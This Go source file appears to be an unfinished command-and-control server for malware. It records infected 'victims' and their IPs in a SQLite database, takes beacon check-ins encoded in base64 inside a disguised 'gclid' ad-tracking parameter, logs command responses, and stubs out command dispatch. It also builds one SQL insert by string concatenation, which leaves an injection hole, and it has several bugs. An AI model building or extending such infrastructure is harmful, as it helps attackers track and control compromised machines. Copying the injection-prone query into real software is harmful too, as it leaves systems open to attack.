package main

import (
	"os"
	"log"
	"fmt"
	"strings"
	"net/http"
	"database/sql"
	"html/template"
	"encoding/base64"
	_ "github.com/mattn/go-sqlite3"
)

/*func newVictim(x []byte) {
	victim.
}*/
func saveResponse(x []byte) bool{
	// Default request from base64
	// id-database==response==status
	victim, err := sql.Open("sqlite3", "./database/victims.db")
	errorStatment(err)
	logs, err := sql.Open("sqlite3", "./database/logs.db")
	errorStatment(err)
	value := strings.Split(string(x), "==")
	fmt.Print("Valor: %s", value)
	err = victim.QueryRow("SELECT uid FROM victims WHERE uid = ?", value[0]).Scan(&value[0])
	fmt.Print(err)
	if err != nil {
		// Defaul request from base64
		// detais==ip
		addVictim, err := victim.Prepare("INSERT INTO victims (details, ip, created) VALUES (?, ?, datetime('now', 'localtime'))")
		addVictim.Exec(value[0], value[1])
		fmt.Print("Add value: %s",addVictim)
		errorStatment(err)
		return false
	} else {
		status, err := logs.Prepare("INSERT INTO logs (uid, response, status) VALUES ("+value[0]+", "+value[1]+", "+value[2]+")")
		fmt.Print(status)
		errorStatment(err)
		return true
	}
}
func queryCommand(x []byte) string {
	return "Query db for command"
}
func errorStatment(err error) {
	if err != nil {
                log.Fatal("error:", err)
        }
}
func pageAPI(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "API here")
}
func proccessData(w http.ResponseWriter, r *http.Request) {
	tmpl := template.Must(template.ParseFiles(os.Args[1]))
	tmpl.Execute(w, nil)
	value, err := base64.StdEncoding.DecodeString(string(r.URL.Query()["gclid"][0]))
	errorStatment(err)
	saveResponse(value)
	command := queryCommand(value)
	fmt.Fprintf(w, "Donate\t%s", command)
}

func main() {
	/*command, err := sql.Open("sqlite3", "./database/commands.db")
	errorStatment(err)*/
	http.HandleFunc("/", proccessData)
	http.HandleFunc("/auth", pageAPI)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
